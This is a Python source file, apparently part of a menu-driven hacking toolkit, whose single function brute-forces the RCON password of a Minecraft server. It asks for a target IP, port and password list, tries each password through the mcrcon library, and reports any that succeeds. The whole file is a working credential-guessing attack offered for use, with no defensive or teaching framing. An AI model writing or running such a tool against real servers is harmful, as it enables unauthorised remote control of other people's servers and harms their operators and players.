#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
from utils import clear, print_banner, gradient_print, gradient_input
try:
    from mcrcon import MCRcon
    RCON_AVAILABLE = True
except ImportError:
    RCON_AVAILABLE = False

def brutercon_interactive():
    clear()
    print_banner()
    if not RCON_AVAILABLE:
        gradient_print(" [Error] mcrcon library not installed. Run: pip install mcrcon", 0.03)
        gradient_input(" Press Enter...")
        return
    gradient_print(" === Brute-force RCON password ===", 0.03)
    ip = gradient_input(" Server IP: ").strip()
    port_str = gradient_input(" RCON port (default 25575): ").strip()
    port = int(port_str) if port_str.isdigit() else 25575
    passwords_file = gradient_input(" Password list file (one per line): ").strip()
    try:
        with open(passwords_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        gradient_print(" Could not read password file.", 0.03)
        time.sleep(1.5)
        return
    gradient_print(f" Testing {len(passwords)} passwords...", 0.03)
    for i, pwd in enumerate(passwords):
        try:
            with MCRcon(ip, pwd, port=port) as mcr:
                gradient_print(f" Found password: {pwd}", 0.02)
                break
        except:
            if (i+1) % 10 == 0:
                gradient_print(f" Tried {i+1}/{len(passwords)}...", 0.01)
    else:
        gradient_print(" Password not found.", 0.03)
    gradient_input("\n Press Enter to return to menu...")